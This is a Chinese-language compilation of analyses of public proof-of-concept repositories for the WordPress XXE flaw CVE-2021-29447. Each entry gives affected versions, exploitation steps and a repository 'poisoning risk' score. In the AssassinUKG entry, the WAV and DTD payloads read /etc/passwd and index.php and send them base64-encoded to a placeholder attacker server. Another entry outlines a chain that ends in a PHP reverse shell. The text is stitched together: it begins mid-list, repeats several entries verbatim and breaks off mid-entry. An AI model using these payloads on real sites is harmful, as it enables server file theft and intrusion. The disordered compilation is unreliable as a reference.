**来源**: [CVE-2021-29447-ArtemCyberLab_Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-.md](../2021/CVE-2021-29447-ArtemCyberLab_Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-.md)

## CVE-2021-29447 WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露，包括数据库凭据，并最终导致远程代码执行

**影响版本:** >= 5.6.0, < 5.7.1，需要PHP 8

**利用条件:** 需要具备上传文件的权限 (如 Author 角色)，服务器运行PHP 8，存在可利用的端口（如80,443,22,3306）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

提供的漏洞利用代码展示了完整的攻击链，从信息收集到获取反向shell。漏洞CVE-2021-29447是WordPress媒体库中的XXE漏洞，该漏洞允许攻击者通过上传特制的恶意WAV文件读取服务器上的敏感文件，比如wp-config.php。漏洞利用过程如下：

1. **侦察和枚举：** 使用Nmap扫描目标主机，发现开放端口和服务版本。使用WPScan枚举用户名，并通过暴力破解获取有效凭据。
2. **XXE 漏洞利用：**  构造包含恶意XML内容的WAV文件，利用XML外部实体注入读取wp-config.php文件。需要搭建一个HTTP服务器来接收和处理泄露的数据。使用php脚本解码base64编码的数据，提取数据库凭据。
3. **数据库访问：** 使用获得的数据库凭据连接到MySQL数据库，提取用户表中的用户名和密码哈希。
4. **密码破解：** 使用John the Ripper破解用户密码哈希，获取明文密码。
5. **权限提升和远程代码执行：** 修改Hello Dolly插件，插入PHP反向shell代码。通过访问修改后的插件页面，触发反向shell连接到攻击者控制的机器。
6. **后渗透：**  在获取shell后，执行提权操作，查找敏感文件。

**关于投毒风险的分析:**

POC代码中包含完整的攻击链，本身并没有明显的投毒代码，但如果使用者不熟悉整个流程，直接复制粘贴执行，可能会留下后门，例如植入的PHP反向shell。此外，攻击者可能将接收泄露数据的 HTTP server  替换成一个恶意站点，窃取攻击者的信息。因此，判定存在一定概率的投毒风险，估计为10%。主要风险点在于使用者对代码理解程度不够，可能直接使用未经验证的代码。


**项目地址:** [ArtemCyberLab/Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-](https://github.com/ArtemCyberLab/Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #5

**来源**: [CVE-2021-29447-AssassinUKG_CVE-2021-29447.md](../2021/CVE-2021-29447-AssassinUKG_CVE-2021-29447.md)

## CVE-2021-29447 - WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露和服务器端请求伪造 (SSRF)

**影响版本:** >= 5.6.0, < 5.7.1 (在 PHP 8 环境下)

**利用条件:** 需要具备上传文件的权限 (如作者角色)，且服务器运行在 PHP 8 环境下。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 漏洞存在于 WordPress 的媒体库中，当 WordPress 运行在 PHP 8 环境下时，具有上传文件权限的用户（例如作者）可以通过上传包含恶意 XML 内容的文件（如特制的 WAV 文件）来触发 XXE 漏洞。

**利用方式：**

1.  **构建恶意 WAV 文件：** 攻击者需要创建一个包含恶意 XML 声明的 WAV 文件。该 XML 声明包含一个外部实体引用，指向攻击者控制的远程 DTD 文件。

    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE ANY[
        <!ENTITY % remote SYSTEM 'http://YOURSEVERIP:PORT/NAMEEVIL.dtd'>
        %remote;%init;%trick;
    ]>
    ```

2.  **创建恶意 DTD 文件：** 攻击者需要在自己的服务器上创建一个 DTD 文件，该文件定义了如何读取服务器上的文件，并将其发送回攻击者。例如，读取 `/etc/passwd` 文件并进行 Base64 编码。

    ```xml
    <!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
    <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
    ```

    或者，读取 WordPress 配置文件 `index.php`。

    ```xml
    <!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=../index.php">
    <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
    ```

3.  **上传恶意 WAV 文件：** 攻击者通过 WordPress 后台的媒体库上传该恶意 WAV 文件。

4.  **触发 XXE：** WordPress 解析该 WAV 文件时，会尝试解析其中的 XML 内容，从而触发 XXE 漏洞，并从攻击者的服务器下载 DTD 文件。

5.  **获取文件内容：** 恶意 DTD 文件会指示 WordPress 读取目标文件（例如 `/etc/passwd` 或 `wp-config.php`），对其进行 Base64 编码，并通过 HTTP 请求将内容发送到攻击者的服务器。

**有效性：**

提供的 POC 代码有效，可以利用该漏洞读取服务器上的文件，或者进行 SSRF 攻击。搜索结果中的多个链接也证实了该漏洞的存在以及利用方式。

**投毒风险：**

代码中存在轻微的投毒风险。主要的风险点在于 DTD 文件是由攻击者提供的。虽然提供的 DTD 示例代码是用来读取文件，但攻击者可以在 DTD 文件中执行其他恶意操作，例如尝试执行代码。但是由于文件读取已经是该漏洞所能达到的最大危害之一。所以判断投毒风险为10%。该值评估仓库中是否隐藏有恶意或非预期行为的代码。例如，某些代码可能会在未经授权的情况下收集用户信息、安装后门或执行其他恶意活动。 

**项目地址:** [AssassinUKG/CVE-2021-29447](https://github.com/AssassinUKG/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #6

**来源**: [CVE-2021-29447-G01d3nW01f_CVE-2021-29447.md](../2021/CVE-2021-29447-G01d3nW01f_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE (XML External Entity)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要WordPress版本在5.6.0到5.7.1之间，并且运行在PHP 8环境下；需要具备上传文件的权限（如Author角色）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于WordPress媒体库中，允许具有文件上传权限的用户利用XML解析漏洞执行XXE攻击。漏洞利用需要WordPress运行在PHP 8环境下，因为该漏洞利用了PHP 8中ID3库的一个缺陷。攻击者可以上传包含恶意XML代码的WAV文件，其中XML代码定义了外部实体，导致服务器尝试解析并加载外部资源。利用方式如下：

1.  攻击者准备一个恶意的DTD文件，该文件包含用于读取服务器文件或执行其他操作的实体。
2.  攻击者使用提供的Python脚本 (`evil-wav-dtd-xxe.py`) 生成一个包含指向恶意DTD的XML的WAV文件。 该脚本会创建一个DTD文件，其中包含一个实体来读取目标文件，并创建一个HTTP请求来将读取的文件内容发送到攻击者的服务器。
3.  攻击者通过WordPress媒体库上传生成的恶意WAV文件。
4.  当WordPress解析该WAV文件时，会触发XXE漏洞，导致服务器加载并执行恶意DTD文件中的指令，将目标服务器上的文件内容通过HTTP请求发送给攻击者。

**有效性评估：**

根据漏洞信息和搜索引擎结果，该漏洞是真实存在的，并且有公开的PoC代码。提供的PoC代码（`evil-wav-dtd-xxe.py`）可以生成恶意的WAV文件和DTD文件，用于利用该漏洞读取服务器上的敏感文件。因此，PoC代码是有效的。

**投毒风险评估：**

查看提供的PoC代码，该代码主要用于生成漏洞利用所需的WAV和DTD文件。 `evil-wav-dtd-xxe.py` 脚本本身的作用就是生成利用漏洞的payload， 从代码逻辑上看，不存在明显的恶意代码或后门。`readme.md` 仅仅是提供使用的说明。

**利用方式总结：**

1.  **权限要求：** 具有上传文件权限的WordPress用户（如Author角色）。
2.  **环境要求：** WordPress版本在5.6.0到5.7.1之间，运行在PHP 8环境下。
3.  **攻击步骤：**
    *   准备恶意DTD文件：该文件定义了读取服务器文件的实体，并将文件内容发送到攻击者控制的服务器。
    *   生成恶意WAV文件：使用`evil-wav-dtd-xxe.py`脚本生成包含指向恶意DTD文件的XML的WAV文件。
    *   上传恶意WAV文件：通过WordPress媒体库上传生成的WAV文件。
    *   触发XXE漏洞：WordPress解析WAV文件时，加载恶意DTD文件，读取服务器文件并通过HTTP请求发送给攻击者。


**项目地址:** [G01d3nW01f/CVE-2021-29447](https://github.com/G01d3nW01f/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #7

**来源**: [CVE-2021-29447-M3l0nPan_wordpress-cve-2021-29447.md](../2021/CVE-2021-29447-M3l0nPan_wordpress-cve-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1，运行在PHP 8环境下

**利用条件:** 需要拥有上传文件权限（例如，作者权限），并且服务器运行在PHP 8环境下

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

该漏洞存在于WordPress的媒体库中，允许具有上传文件权限的用户通过上传包含恶意XML的音频文件（如WAV或MP3）来触发XXE漏洞。此漏洞要求WordPress运行在PHP 8环境下，因为该版本的PHP中使用的XML解析器存在缺陷。攻击者可以利用此漏洞读取服务器上的敏感文件。PoC利用了本地启动HTTP服务的方式来接收目标服务器发送的文件内容，相对安全。投毒风险极低，主要风险点在脚本第一行的`#!/usr/bin/dev python3`，存在一定的误导性，如果用户直接复制该代码，可能会导致执行失败，但对安全性没有影响。主要功能代码位于`wordpress-cve-2021-29447.py`文件中，实现了漏洞利用的全部流程，包括身份验证、恶意文件上传和文件读取。

**项目地址:** [M3l0nPan/wordpress-cve-2021-29447](https://github.com/M3l0nPan/wordpress-cve-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #8

**来源**: [CVE-2021-29447-Tea-On_CVE-2021-29447-Authenticated-XXE-WordPress-5.6-5.7.md](../2021/CVE-2021-29447-Tea-On_CVE-2021-29447-Authenticated-XXE-WordPress-5.6-5.7.md)

# CVE-2021-29447

> 📦 该CVE有 **18** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-29447-0xRar_CVE-2021-29447-PoC.md](../2021/CVE-2021-29447-0xRar_CVE-2021-29447-PoC.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露，服务器端请求伪造 (SSRF)

**影响版本:** 5.6.0 <= version < 5.7.1 (需要PHP 8环境)

**利用条件:** 需要 WordPress 站点运行在 PHP 8 环境，并具有文件上传权限（例如 Author 角色）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-29447 是一个 WordPress 的 XXE 漏洞，存在于 5.6 到 5.7 版本中，且需要运行在 PHP 8 环境下。攻击者需要具备文件上传权限，比如拥有 Author 角色。漏洞原理是 WordPress 在处理上传的媒体文件时，特别是 WAVE 音频文件，其中使用的 ID3 解析库存在 XML 解析问题。攻击者可以构造恶意的 WAVE 文件，其中包含指向外部实体的 XML 代码，从而读取服务器上的任意文件，或进行服务器端请求伪造。

**利用方式:**

1.  攻击者首先需要一个具有文件上传权限的 WordPress 账户（如 Author）。
2.  攻击者构造一个包含恶意 XML 内容的 WAVE 文件（payload.wav）。该 XML 声明了一个外部实体，指向攻击者控制的服务器上的 DTD 文件。
3.  攻击者在自己的服务器上部署一个恶意的 DTD 文件（evil.dtd）。该 DTD 文件定义了另一个实体，用于读取目标服务器上的文件内容，并通过 HTTP 请求将内容发送给攻击者。
4.  攻击者将构造的恶意 WAVE 文件上传到 WordPress 的媒体库。
5.  当 WordPress 解析该 WAVE 文件时，会触发 XXE 漏洞，加载攻击者服务器上的 DTD 文件，并读取目标文件内容，将 base64 编码后的内容发送到攻击者的服务器。
6.  攻击者从 HTTP 请求中获取 base64 编码的数据，并进行解码，得到目标文件的内容。

**POC 代码分析:**

提供的 Python 脚本 `PoC.py` 用于自动化生成恶意的 `payload.wav` 和 `evil.dtd` 文件。该脚本需要指定攻击者的服务器 IP 地址、端口，以及要读取的目标文件路径。脚本还会启动一个简单的 PHP HTTP 服务器，用于接收目标服务器发送的请求。

**投毒风险评估:**

代码本身功能明确，就是用于生成payload和启动http server，没有发现任何隐藏的恶意代码或后门。decode.php只是用来解码base64数据，所以判定没有投毒风险。

**项目地址:** [0xRar/CVE-2021-29447-PoC](https://github.com/0xRar/CVE-2021-29447-PoC)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #2

**来源**: [CVE-2021-29447-0xricksanchez_CVE-2021-29447.md](../2021/CVE-2021-29447-0xricksanchez_CVE-2021-29447.md)

## CVE-2021-29447 - WordPress Authenticated XXE attack in Media Library

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML External Entity (XXE) Injection

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1 (需要 PHP 8)

**利用条件:** 需要具有文件上传权限（例如，作者角色），且WordPress运行在PHP 8环境下。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 漏洞存在于 WordPress 5.6.0 到 5.7.1 版本之间，允许具有文件上传权限的用户（例如作者）通过媒体库上传包含恶意 XML 内容的文件，从而触发 XXE 攻击。漏洞利用依赖于 WordPress 使用 PHP 8，因为 PHP 8 对 XML 解析的处理方式使得 XXE 攻击成为可能。

**有效性：**
提供的 POC 代码 `expl.py` 针对的是利用 WAV 文件中的 iXML 块进行 XXE 注入。这个POC专门针对 WordPress BookingPress 插件 < 1.0.11，但该漏洞的描述是通用的，只要目标应用解析包含恶意 XML 的 iXML 块，就可能受到攻击。由于CVE-2021-29447描述的场景和POC有一定关联，判断该POC具有一定的有效性，可以尝试在受影响的 WordPress 版本上利用。

**投毒风险：**
代码中存在投毒的风险较低。`expl.py` 脚本的主要功能是生成包含 XXE payload 的恶意 WAV 文件。Payload 从命令行参数获取IP和端口，攻击者需要配置自己的HTTP服务来接收数据。`README.md` 中也描述了整个利用流程，从生成恶意文件到启动 HTTP 服务器再到解码数据。但是如果攻击者没有配置自己的服务器，可能会导致数据泄露到poc作者搭建的服务器。因此推断存在10%的投毒风险。

**利用方式：**
1.  **生成恶意 WAV 文件：** 运行 `expl.py` 脚本，指定攻击者控制的服务器 IP 地址和端口，生成包含 XXE payload 的 `exploit.wav` 文件。
2.  **启动 HTTP 服务器：** 在攻击者服务器上启动一个 HTTP 服务器，用于提供外部实体定义 (DTD)。
3.  **上传恶意文件：** 具有文件上传权限的 WordPress 用户将 `exploit.wav` 文件上传到媒体库。
4.  **触发 XXE：** WordPress 解析上传的 WAV 文件，当解析 iXML 块时，会尝试从攻击者控制的服务器下载 DTD 文件，从而触发 XXE 攻击，导致服务器上的文件被读取并以 Base64 编码的形式发送到攻击者的服务器。
5.  **解码数据：** 攻击者从 HTTP 服务器的日志中获取 Base64 编码的数据，并进行解码，获取被读取的文件内容。

**项目地址:** [0xricksanchez/CVE-2021-29447](https://github.com/0xricksanchez/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #3

**来源**: [CVE-2021-29447-Abdulazizalsewedy_CVE-2021-29447.md](../2021/CVE-2021-29447-Abdulazizalsewedy_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (requires PHP 8)

**利用条件:** 需要 WordPress 运行在 PHP 8 环境，且攻击者需要具备上传文件的权限（如 Author 角色）

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-29447 是一个存在于 WordPress 5.6.0 到 5.7.1 版本的 XXE 漏洞。该漏洞允许具有上传文件权限的用户（例如，作者）通过上传包含恶意 XML 内容的文件（如特制的 WAVE 文件）来执行 XXE 攻击。

**有效性分析：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以判断该漏洞的 POC 代码是有效的。漏洞库信息、搜索引擎结果和 POC 代码的 README.md 文件均描述了该漏洞的利用方式和影响。

**投毒风险分析：**
提供的漏洞利用代码（README.md）主要描述了漏洞的原理、利用方法和修复方案，并未发现明显的恶意代码或后门。其核心步骤包括：

1.  创建一个包含恶意 XML 内容的 WAVE 文件。
2.  搭建一个 HTTP 服务器，用于接收 XXE 攻击泄露的数据。
3.  将恶意 WAVE 文件上传到 WordPress 的媒体库。
4.  从 HTTP 服务器的日志中获取泄露的敏感信息（例如，wp-config.php 中的数据库凭据）。

虽然代码本身没有直接的投毒行为，但攻击者可能利用泄露的数据库凭据进一步入侵系统。因此，投毒风险较低，估计为 5%。

**利用方式分析：**
该漏洞的利用方式主要分为以下几个步骤：

1.  **权限获取：** 攻击者需要具备 WordPress 中上传文件的权限（如 Author 角色）。
2.  **恶意文件制作：** 攻击者需要构造一个恶意的 WAVE 文件，该文件包含指向外部实体的 XML 内容，用于触发 XXE 漏洞。DTD文件包含需要泄露的文件路径，例如 wp-config.php。
3.  **HTTP服务器搭建：** 攻击者需要搭建一个 HTTP 服务器，用于接收来自 WordPress 服务器的请求，这些请求包含通过 XXE 漏洞泄露的敏感信息。Zlib解码用于有效的提取数据
4.  **文件上传：** 攻击者将制作好的恶意 WAVE 文件上传到 WordPress 的媒体库。
5.  **信息泄露：** 当 WordPress 解析上传的 WAVE 文件时，会触发 XXE 漏洞，导致服务器向攻击者的 HTTP 服务器发送包含敏感信息的请求。
6.  **数据提取：** 攻击者从 HTTP 服务器的日志中提取泄露的敏感信息，例如 wp-config.php 文件中的数据库凭据。
7.  **后续利用：** 攻击者可以利用泄露的数据库凭据登录数据库，并进一步获取管理员权限，甚至控制整个 WordPress 网站。

**项目地址:** [Abdulazizalsewedy/CVE-2021-29447](https://github.com/Abdulazizalsewedy/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #4

**来源**: [CVE-2021-29447-ArtemCyberLab_Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-.md](../2021/CVE-2021-29447-ArtemCyberLab_Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-.md)

## CVE-2021-29447 WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露，包括数据库凭据，并最终导致远程代码执行

**影响版本:** >= 5.6.0, < 5.7.1，需要PHP 8

**利用条件:** 需要具备上传文件的权限 (如 Author 角色)，服务器运行PHP 8，存在可利用的端口（如80,443,22,3306）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

提供的漏洞利用代码展示了完整的攻击链，从信息收集到获取反向shell。漏洞CVE-2021-29447是WordPress媒体库中的XXE漏洞，该漏洞允许攻击者通过上传特制的恶意WAV文件读取服务器上的敏感文件，比如wp-config.php。漏洞利用过程如下：

1. **侦察和枚举：** 使用Nmap扫描目标主机，发现开放端口和服务版本。使用WPScan枚举用户名，并通过暴力破解获取有效凭据。
2. **XXE 漏洞利用：**  构造包含恶意XML内容的WAV文件，利用XML外部实体注入读取wp-config.php文件。需要搭建一个HTTP服务器来接收和处理泄露的数据。使用php脚本解码base64编码的数据，提取数据库凭据。
3. **数据库访问：** 使用获得的数据库凭据连接到MySQL数据库，提取用户表中的用户名和密码哈希。
4. **密码破解：** 使用John the Ripper破解用户密码哈希，获取明文密码。
5. **权限提升和远程代码执行：** 修改Hello Dolly插件，插入PHP反向shell代码。通过访问修改后的插件页面，触发反向shell连接到攻击者控制的机器。
6. **后渗透：**  在获取shell后，执行提权操作，查找敏感文件。

**关于投毒风险的分析:**

POC代码中包含完整的攻击链，本身并没有明显的投毒代码，但如果使用者不熟悉整个流程，直接复制粘贴执行，可能会留下后门，例如植入的PHP反向shell。此外，攻击者可能将接收泄露数据的 HTTP server  替换成一个恶意站点，窃取攻击者的信息。因此，判定存在一定概率的投毒风险，估计为10%。主要风险点在于使用者对代码理解程度不够，可能直接使用未经验证的代码。


**项目地址:** [ArtemCyberLab/Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-](https://github.com/ArtemCyberLab/Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #5

**来源**: [CVE-2021-29447-AssassinUKG_CVE-2021-29447.md](../2021/CVE-2021-29447-AssassinUKG_CVE-2021-29447.md)

## CVE-2021-29447 - WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露和服务器端请求伪造 (SSRF)

**影响版本:** >= 5.6.0, < 5.7.1 (在 PHP 8 环境下)

**利用条件:** 需要具备上传文件的权限 (如作者角色)，且服务器运行在 PHP 8 环境下。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 漏洞存在于 WordPress 的媒体库中，当 WordPress 运行在 PHP 8 环境下时，具有上传文件权限的用户（例如作者）可以通过上传包含恶意 XML 内容的文件（如特制的 WAV 文件）来触发 XXE 漏洞。

**利用方式：**

1.  **构建恶意 WAV 文件：** 攻击者需要创建一个包含恶意 XML 声明的 WAV 文件。该 XML 声明包含一个外部实体引用，指向攻击者控制的远程 DTD 文件。

    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE ANY[
        <!ENTITY % remote SYSTEM 'http://YOURSEVERIP:PORT/NAMEEVIL.dtd'>
        %remote;%init;%trick;
    ]>
    ```

2.  **创建恶意 DTD 文件：** 攻击者需要在自己的服务器上创建一个 DTD 文件，该文件定义了如何读取服务器上的文件，并将其发送回攻击者。例如，读取 `/etc/passwd` 文件并进行 Base64 编码。

    ```xml
    <!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
    <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
    ```

    或者，读取 WordPress 配置文件 `index.php`。

    ```xml
    <!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=../index.php">
    <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
    ```

3.  **上传恶意 WAV 文件：** 攻击者通过 WordPress 后台的媒体库上传该恶意 WAV 文件。

4.  **触发 XXE：** WordPress 解析该 WAV 文件时，会尝试解析其中的 XML 内容，从而触发 XXE 漏洞，并从攻击者的服务器下载 DTD 文件。

5.  **获取文件内容：** 恶意 DTD 文件会指示 WordPress 读取目标文件（例如 `/etc/passwd` 或 `wp-config.php`），对其进行 Base64 编码，并通过 HTTP 请求将内容发送到攻击者的服务器。

**有效性：**

提供的 POC 代码有效，可以利用该漏洞读取服务器上的文件，或者进行 SSRF 攻击。搜索结果中的多个链接也证实了该漏洞的存在以及利用方式。

**投毒风险：**

代码中存在轻微的投毒风险。主要的风险点在于 DTD 文件是由攻击者提供的。虽然提供的 DTD 示例代码是用来读取文件，但攻击者可以在 DTD 文件中执行其他恶意操作，例如尝试执行代码。但是由于文件读取已经是该漏洞所能达到的最大危害之一。所以判断投毒风险为10%。该值评估仓库中是否隐藏有恶意或非预期行为的代码。例如，某些代码可能会在未经授权的情况下收集用户信息、安装后门或执行其他恶意活动。 

**项目地址:** [AssassinUKG/CVE-2021-29447](https://github.com/AssassinUKG/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #6

**来源**: [CVE-2021-29447-G01d3nW01f_CVE-2021-29447.md](../2021/CVE-2021-29447-G01d3nW01f_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE (XML External Entity)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要WordPress版本在5.6.0到5.7.1之间，并且运行在PHP 8环境下；需要具备上传文件的权限（如Author角色）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于WordPress媒体库中，允许具有文件上传权限的用户利用XML解析漏洞执行XXE攻击。漏洞利用需要WordPress运行在PHP 8环境下，因为该漏洞利用了PHP 8中ID3库的一个缺陷。攻击者可以上传包含恶意XML代码的WAV文件，其中XML代码定义了外部实体，导致服务器尝试解析并加载外部资源。利用方式如下：

1.  攻击者准备一个恶意的DTD文件，该文件包含用于读取服务器文件或执行其他操作的实体。
2.  攻击者使用提供的Python脚本 (`evil-wav-dtd-xxe.py`) 生成一个包含指向恶意DTD的XML的WAV文件。 该脚本会创建一个DTD文件，其中包含一个实体来读取目标文件，并创建一个HTTP请求来将读取的文件内容发送到攻击者的服务器。
3.  攻击者通过WordPress媒体库上传生成的恶意WAV文件。
4.  当WordPress解析该WAV文件时，会触发XXE漏洞，导致服务器加载并执行恶意DTD文件中的指令，将目标服务器上的文件内容通过HTTP请求发送给攻击者。

**有效性评估：**

根据漏洞信息和搜索引擎结果，该漏洞是真实存在的，并且有公开的PoC代码。提供的PoC代码（`evil-wav-dtd-xxe.py`）可以生成恶意的WAV文件和DTD文件，用于利用该漏洞读取服务器上的敏感文件。因此，PoC代码是有效的。

**投毒风险评估：**

查看提供的PoC代码，该代码主要用于生成漏洞利用所需的WAV和DTD文件。 `evil-wav-dtd-xxe.py` 脚本本身的作用就是生成利用漏洞的payload， 从代码逻辑上看，不存在明显的恶意代码或后门。`readme.md` 仅仅是提供使用的说明。

**利用方式总结：**

1.  **权限要求：** 具有上传文件权限的WordPress用户（如Author角色）。
2.  **环境要求：** WordPress版本在5.6.0到5.7.1之间，运行在PHP 8环境下。
3.  **攻击步骤：**
    *   准备恶意DTD文件：该文件定义了读取服务器文件的实体，并将文件内容发送到攻击者控制的服务器。
    *   生成恶意WAV文件：使用`evil-wav-dtd-xxe.py`脚本生成包含指向恶意DTD文件的XML的WAV文件。
    *   上传恶意WAV文件：通过WordPress媒体库上传生成的WAV文件。
    *   触发XXE漏洞：WordPress解析WAV文件时，加载恶意DTD文件，读取服务器文件并通过HTTP请求发送给攻击者。


**项目地址:** [G01d3nW01f/CVE-2021-29447](https://github.com/G01d3nW01f/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #7

**来源**: [CVE-2021-29447-M3l0nPan_wordpress-cve-2021-29447.md](../2021/CVE-2021-29447-M3l0nPan_wordpress-cve-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1，运行在PHP 8环境下

**利用条件:** 需要拥有上传文件权限（例如，作者权限），并且服务器运行在PHP 8环境下

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

该漏洞存在于WordPress的媒体库中，允许具有上传文件权限的用户通过上传包含恶意XML的音频文件（如WAV或MP3）来触发XXE漏洞。此漏洞要求WordPress运行在PHP 8环境下，因为该版本的PHP中使用的XML解析器存在缺陷。攻击者可以利用此漏洞读取服务器上的敏感文件。PoC利用了本地启动HTTP服务的方式来接收目标服务器发送的文件内容，相对安全。投毒风险极低，主要风险点在脚本第一行的`#!/usr/bin/dev python3`，存在一定的误导性，如果用户直接复制该代码，可能会导致执行失败，但对安全性没有影响。主要功能代码位于`wordpress-cve-2021-29447.py`文件中，实现了漏洞利用的全部流程，包括身份验证、恶意文件上传和文件读取。

**项目地址:** [M3l0nPan/wordpress-cve-2021-29447](https://github.com/M3l0nPan/wordpress-cve-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #8

**来源**: [CVE-2021-29447-Val-Resh_CVE-2021-29447-POC.md](../2021/CVE-2021-29447-Val-Resh_CVE-2021-29447-POC.md)

## CVE-2021-29447 - WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露、服务器端请求伪造 (SSRF)

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要 WordPress 版本在 5.6.0 到 5.7.1 之间，运行在 PHP 8 环境下，且攻击者具有上传文件的权限（如 Author 角色）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 是一个 WordPress 的 XXE 漏洞，存在于 Media Library 的 XML 解析过程中。攻击者（需要具有上传文件的权限，如 Author 角色）可以上传包含恶意 XML 代码的文件（如修改后的 WAV 文件），利用 WordPress 使用的 ID3 库中的漏洞，触发 XXE 攻击，读取服务器上的敏感文件，或者进行服务器端请求伪造 (SSRF)。此漏洞需要 WordPress 运行在 PHP 8 环境下才会生效。

**利用方式：**
1.  **身份验证：** 使用具有上传权限的用户的用户名和密码登录 WordPress 后台。
2.  **获取 Nonce：** 从 `wp-admin/upload.php` 页面获取上传文件的 nonce 值。
